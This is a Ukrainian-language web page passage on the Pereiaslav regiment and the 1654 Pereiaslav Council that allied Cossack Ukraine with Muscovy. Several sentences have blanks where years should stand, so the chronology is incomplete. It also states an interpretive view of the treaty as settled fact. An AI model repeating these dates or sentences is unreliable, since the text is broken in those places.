	<p>Переяславський полк був одним з найбільших в Україні року налічував 18 сотень. Переяслав залишався полковим містом до  р. Під час козацької війни Переяслав був важливим центром постачання зброї і харчів для війська. У цей час він відіграє роль дипломатичного центру держави. Сюди приїздили польські, московські, угорські, татарські, османські посли. Війна з Річчю Посполитою обіцяла бути довгою й кровопролитною, татари й османи не були надійними союзниками, тому гетьман неодноразово звертався до московського уряду із пропозицією про військовий союз України з Московським царством.</p>
<p>У жовтні  р. Земський собор у Москві нарешті ухвалив рішення про альянс. До Переяслава 31 грудня року прибуло посольство від московського царя Алєксєя Міхайловіча на чолі з боярином Василем Бутурліним.</p><img src="https://i.ytimg.com/vi/JodAcU6tPHo/maxresdefault.jpg" alt="" style="max-width: 480px; max-height: 480px;"/><p>Згоди домоглися після бурхливої дискусії й взаємних компромісів. Основним змістом угоди, оформленої у вигляді чолобитної на ім'я царя, було те, що Україна прийняла протекторат московського самодержця, зберігаючи повну як у внутрішніх, так і в зовнішніх справах автономію, свій республіканський лад і особливий козацький устрій. Україна мала право підтримувати дипломатичні відносини з іншими державами, за винятком Речі Посполитої й Османською імперії.</p>
<p>Зранку 8 січня старшинська рада прийняла уточнення умов угоди. У другій половині дня скликали загальну раду на центральній площі. Зібралася майже вся козацька старшина, керівники полків, по 5—7 козаків з кожного полку, духівництво, міщани тощо. Переяславський полк був у повному складі. По закінченні ради гетьман, полковники та старшина вирушили до Успенської церкви, де в присутності послів і московських священиків склали присягу московському царю.</p>
		
